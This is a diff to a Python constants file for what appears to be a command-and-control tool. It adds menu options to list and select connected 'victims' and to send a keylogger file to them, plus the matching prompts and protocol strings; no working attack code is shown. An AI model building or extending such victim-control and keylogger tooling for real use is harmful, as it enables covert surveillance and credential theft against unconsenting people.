@@ -4,6 +4,8 @@ MAX_PORT_RANGE = 65536
 LOCAL_HOST = "localhost"
 LOCAL_HOST_VALUE = "127.0.0.1"
 MIN_QUEUE_SIZE = 5
+CLIENT_LIST_INITIAL_SIZE = 1
+NEW_CONNECTION_MSG = "[+] NOTICE: There is a new connection that has connected ({})"
 
 
 # MENU Constants
@@ -30,7 +32,9 @@ MENU_ITEM_SEVEN = "7 - Get a file from a Victim"
 MENU_ITEM_EIGHT = "8 - Run program"
 MENU_ITEM_NINE = "9 - Watch file"
 MENU_ITEM_TEN = "10 - Watch directory"
-MENU_ITEM_ELEVEN = "11 - Uninstall"
+MENU_ITEM_ELEVEN = "11 - Get List of All Connected Victim(s)"
+MENU_ITEM_TWELVE = "12 - Connect to a Specific Victim"
+MENU_ITEM_THIRTEEN = "13 - Uninstall"
 PERFORM_MENU_ITEM_ONE = 1
 PERFORM_MENU_ITEM_TWO = 2
 PERFORM_MENU_ITEM_THREE = 3
@@ -42,14 +46,37 @@ PERFORM_MENU_ITEM_EIGHT = 8
 PERFORM_MENU_ITEM_NINE = 9
 PERFORM_MENU_ITEM_TEN = 10
 PERFORM_MENU_ITEM_ELEVEN = 11
+PERFORM_MENU_ITEM_TWELVE = 12
+PERFORM_MENU_ITEM_THIRTEEN = 13
 MIN_MENU_ITEM_VALUE = 1
-MAX_MENU_ITEM_VALUE = 11
-MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item: {}..."
+MAX_MENU_ITEM_VALUE = 13
+MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
 
 # MENU ITEM 5 - DISCONNECT Constants
 DISCONNECT_FROM_VICTIM_MSG = "[+] DISCONNECTING FROM VICTIM: Now disconnecting from victim {}..."
 DISCONNECT_FROM_VICTIM_SUCCESS = "[+] DISCONNECT SUCCESSFUL: Disconnection was successful!"
 DISCONNECT_FROM_VICTIM_ERROR = "[+] DISCONNECT ERROR: There is no such client/victim to disconnect from!"
+ENTER_TARGET_IP_DISCONNECT_PROMPT = "[+] Enter victim IP address to disconnect from: "
+ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from: "
+
+# MENU ITEM 3 - TRANSFER KEYLOG Constants
+KEYLOG_FILE_NAME = "keylogger.py"
+TRANSFER_KEYLOG_MSG = "GET KEYLOG"
+RECEIVED_CONFIRMATION_MSG = "OK"
+FILE_NAME_TRANSFER_MSG = "[+] Sending file: {}"
+FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
+FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
+END_OF_FILE_SIGNAL = b"END_OF_FILE"
+VICTIM_ACK = "ACK"
+TARGET_VICTIM_NOT_FOUND = "[+] ERROR: Target victim not found!"
+ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
+ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
+NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
+                              "connected to any clients")
+
+# MENU ITEM 12 - Connect to a specific victim
+INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
+
 
 # DESTINATION IP/PORT Constants
 NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
